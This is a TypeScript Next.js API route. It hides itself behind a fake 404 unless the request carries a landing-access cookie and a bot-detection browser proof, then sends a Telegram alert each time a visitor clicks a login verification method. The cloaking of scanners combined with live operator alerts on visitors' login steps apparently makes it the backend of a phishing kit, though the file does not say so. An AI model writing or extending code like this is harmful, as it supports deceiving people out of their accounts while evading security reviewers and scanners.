import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { LANDING_ACCESS_COOKIE } from "@/lib/landing-access-cookie"
import { verifyLandingGrantToken } from "@/lib/landing-grant-token"
import { hasBrowserProof } from "@/lib/bot-risk/proof-cookies"

export async function POST(request: NextRequest) {
  if (!isLocalTestingUnlocked()) {
    const guardReq = request as unknown as NextRequest
    const guardIp = getClientIpFromRequest(guardReq)
    const guardUa = guardReq.headers.get("user-agent") || ""
    const guardGrant = guardReq.cookies.get(LANDING_ACCESS_COOKIE)?.value
    const guardGrantOk = verifyLandingGrantToken(guardGrant, guardIp, guardUa) || guardGrant === "1"
    if (!guardGrantOk || !hasBrowserProof(guardReq)) {
      return NextResponse.json({ error: "Not Found" }, { status: 404 })
    }
  }

  try {
    const body = await request.json()
    const eventType = typeof body.type === "string" ? body.type.trim() : ""

    if (eventType === "login_back_to_verification_methods") {
      await telegramService.sendVerificationClickNotification(
        "login_back_to_verification_methods",
      )
      return NextResponse.json({ success: true })
    }

    const verificationType =
      (typeof body.verificationType === "string" && body.verificationType.trim()) ||
      (typeof body.method === "string" && body.method.trim()) ||
      eventType ||
      ""
    await telegramService.sendVerificationClickNotification(verificationType)
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification click notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
